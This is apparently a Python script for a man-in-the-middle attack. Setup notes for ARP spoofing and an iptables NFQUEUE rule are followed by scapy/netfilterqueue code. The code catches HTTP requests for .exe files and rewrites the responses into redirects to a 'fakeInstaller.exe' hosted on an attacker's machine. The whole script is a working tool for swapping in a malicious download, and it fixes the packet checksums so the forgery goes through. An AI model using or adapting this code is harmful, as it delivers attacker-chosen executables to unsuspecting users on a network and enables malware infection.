#!/usr/bin/env python

'''
    ARP Spoof against the target
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -I FORWARD -j NFQUEUE --queue-num 0

    We use forward queue for remote computers
    If we want to test on our local machine, we must redirect the input and ouput packet chains


    Install netfilterqueue by:
    pip3 install -U git+https://github.com/kti/python-netfilterqueue

    run:
    iptables --flush
    when done
'''

# Access the queue by:
import argparse
import netfilterqueue as nfq
import scapy.all as sp

def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

acks = []
def process(packet):
    sp_packet = sp.IP(packet.get_payload())
    if sp_packet.haslayer(sp.Raw):
        if sp_packet.haslayer(sp.TCP):
            if sp_packet[sp.TCP].dport == 80:
                #print("HTTP request : ")
                if "exe" in str(sp_packet[sp.Raw].load):
                    print('[+] Requested EXE file ')
                    acks.append(sp_packet[sp.TCP].ack)
            if sp_packet[sp.TCP].sport == 80:
                if (sp_packet[sp.TCP].seq) in acks:
                    acks.remove(sp_packet[sp.TCP].seq)
                    print("[+] HTTP response of EXE Request")
                    print("[INFO] Replacing file, redirecting...")
                    #print(sp_packet[sp.Raw].load)
                    '''
                            CHANGE THE LOCATION TO YOUR OWN FILE
                    '''
                    sp_packet[sp.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://192.168.1.198/ftp/fakeInstaller.exe\n"
                    del sp_packet[sp.IP].len
                    del sp_packet[sp.IP].chksum
                    del sp_packet[sp.TCP].chksum
                    packet.set_payload(bytes(sp_packet))
    packet.accept()


queue = nfq.NetfilterQueue()
queue.bind(0, process)
queue.run()